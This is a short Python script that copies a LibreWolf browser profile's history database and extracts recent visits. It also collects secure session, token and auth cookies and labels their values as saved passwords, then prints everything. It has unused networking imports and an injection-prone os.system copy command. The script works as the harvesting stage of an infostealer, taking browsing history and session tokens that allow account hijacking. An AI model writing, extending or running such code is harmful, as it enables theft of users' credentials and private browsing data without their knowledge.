import os
import sys
import json
import uuid
import socket
import sqlite3
import platform
import requests
import tempfile
import browser_cookie3
import psutil
from datetime import datetime, timedelta

def extract_history_from_sqlite(path, query, parse_row_fn):
    if not os.path.exists(path):
        return []
    with tempfile.NamedTemporaryFile(delete=False) as tmp:
        temp_path = tmp.name
    try:
        os.system(f"cp '{path}' '{temp_path}'")
        conn = sqlite3.connect(temp_path)
        cursor = conn.cursor()
        cursor.execute(query)
        history = [parse_row_fn(row) for row in cursor.fetchall()]
        conn.close()
        return history
    except Exception:
        return []
    finally:
        os.remove(temp_path)

def extract_librewolf_history():
    base = os.path.expanduser("~/.librewolf") if platform.system() == "Linux" else ""
    if not base or not os.path.exists(base):
        return []
    profiles = [d for d in os.listdir(base) if "default" in d]
    if not profiles:
        return []
    path = os.path.join(base, profiles[0], "places.sqlite")

    query = """
        SELECT url, title, visit_date
        FROM moz_places JOIN moz_historyvisits
        ON moz_historyvisits.place_id = moz_places.id
        ORDER BY visit_date DESC LIMIT 100
    """
    def parser(row):
        url, title, ts = row
        dt = datetime.fromtimestamp(ts / 1_000_000).isoformat()
        return {"url": url, "title": title, "visit_time": dt, "browser_type": "librewolf"}

    return extract_history_from_sqlite(path, query, parser)

def get_browser_history():
    return extract_librewolf_history()


def get_saved_credentials():
    credentials = []
    try:
        for cookie in browser_cookie3.librewolf():
            if cookie.secure and cookie.name.lower() in ("session", "token", "auth"):
                credentials.append({
                    "website": cookie.domain,
                    "username": cookie.name,
                    "password": cookie.value,
                    "browser_type": "librewolf"
                })
    except Exception:
        pass
    return credentials

print(extract_librewolf_history())
print(get_browser_history())
print(get_saved_credentials())
